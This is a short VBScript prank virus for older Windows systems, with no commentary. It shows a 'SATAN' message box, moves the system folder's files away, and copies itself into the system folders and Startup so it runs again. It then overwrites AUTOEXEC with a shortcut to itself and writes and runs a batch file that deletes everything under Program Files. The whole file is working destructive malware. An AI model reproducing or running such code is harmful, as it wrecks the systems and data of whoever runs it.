Result=MsgBox("your computer is in the controle of SATAN!", 16, "Fear")

Dim filesys, newfolder, newfolderpath 
newfolderpath = "c:\WINDOWS\MyFolder" 
set filesys=CreateObject("Scripting.FileSystemObject") 
If Not filesys.FolderExists(newfolderpath) Then 
Set newfolder = filesys.CreateFolder(newfolderpath) 

dim filesys
set filesys=CreateObject("Scripting.FileSystemObject")
filesys.MoveFile "C:\WINDOWS\SYSTEM\*.*","C:\WINDOWS\MyFolder\"

set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\SYSTEM\fun.vbs", True

set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\SYSTEM32\fun.vbs", 
True

set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\Start Menu\Programs\StartUp\fun.vbs", True


dim filesysdelfile
Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
filesysdelfile.DeleteFile "C:\WINDOWS\COMMAND\EBD\AUTOEXEC",True
Set filesysdelfile = Nothing

Dim shell, msc, batch, fso
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\fun.vbs", True
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\WINDOWS\COMMAND\EBD\AUTOEXEC.bat")
msc.TargetPath=shell.ExpandEnvironment("C:\fun.vbs")
msc.WindowStyle=4
msc.Save
set batch=fso.CreateTextFile("C:\lnk.bat")
batch.WriteLine "@echo off"
batch.WriteLine "cls"
batch.WriteLine "deltree C:\Program Files\*.*"
batch.Close
shell.Run  "C:\lnk.bat"

end if

